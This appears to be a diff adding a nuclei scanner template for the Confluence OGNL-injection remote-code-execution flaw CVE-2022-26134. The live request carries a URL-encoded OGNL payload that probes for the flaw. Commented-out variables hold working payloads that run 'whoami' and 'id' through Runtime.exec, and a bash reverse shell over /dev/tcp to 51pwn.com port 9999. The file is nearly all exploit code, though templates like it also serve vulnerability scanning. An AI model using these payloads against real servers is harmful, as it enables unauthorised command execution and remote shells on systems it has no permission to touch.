@@ -1,0 +1,88 @@
+id: atlassian_confluence_CVE_2022_26134_RCE
+info:
+  name: atlassian_confluence_CVE_2022_26134_RCE
+  author: 51pwn
+  severity: critical
+  reference:
+    - https://github.com/hktalent/nuclei-templates
+    - https://51pwn.com
+  tags: atlassian,confluence,CVE-2022-26134,web,RCE
+
+variables:
+  # for check
+  # .(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/
+  # SetHd: ".%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
+  # SetPld: "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29"
+  # id
+  # %28java.net.InetAddress.getByName%28%22{{interactsh-url}}%2229%29%.
+  # CheckPayload: "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22Host%22%2C%23a%29%29%7D/"
+  CheckPayload1: "%24%7B%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22Host%22%2C%22{{randstr}}%22%29%7D/"
+  # CheckPayload1: "%24%7B%28java.net.InetAddress.getByName%28%22{{interactsh-url}}%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22Host%22%2C%2251pwn%22%29%29%7D/"
+  # for reverse
+  # RvsHst: "51pwn.com"
+  # RvsHstPort: "9999"
+  # RvsPayload: "/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/{{RvsHst}}/{{RvsHstPort}}%200%3E%261%27%29.start%28%29%22%29%7D/"
+  # GET {{mypaths}}/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/docker.for.mac.localhost/9999%200%3E%261%27%29.start%28%29%22%29%7D/ HTTP/1.1
+#   # 107.182.191.202
+requests:
+  - raw:
+      # - |+
+      #   GET {{mypaths}}/{{RvsPayload}} HTTP/1.1
+      #   Host: {{Hostname}}
+      #   User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+      #   Accept:*/*
+      #   Pragma:no-cache
+      #   Accept-Encoding:gzip, deflate
+      #   Connection: close
+      #   Content-Length: 0
+        
+      - |+
+        GET {{mypaths}}/{{CheckPayload1}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Accept:*/*
+        Pragma:no-cache
+        Accept-Encoding:gzip, deflate
+        Connection: close
+        Content-Length: 0
+        
+      # end payload
+    payloads:
+      mypaths:
+        - "/bootstrap"
+        - ""
+    attack: pitchfork 
+    unsafe: true
+    # pipeline: true
+    # pipeline-concurrent-connections: 40
+    # pipeline-requests-per-connection: 25000
+    cookie-reuse: true
+    req-condition: true
+    stop-at-first-match: true
+    # matchers-condition: or
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - '(uid=[^\n\r\\]+)'
+      - type: word
+        part: header
+        words: 
+          - "Host: {{randstr}}"
+      # - type: word
+      #   part: interactsh_protocol
+      #   words:
+      #     - "dns"
+        condition: or
+    extractors:
+      - type: regex
+        part: header
+        name: uid
+        regex:
+          - '(uid=[^\n\r\\]+)'
+          # - '(X-Confluence-Request-Time)'
+      - type: regex
+        part: header
+        name: host
+        regex:
+          - '({{randstr}})'
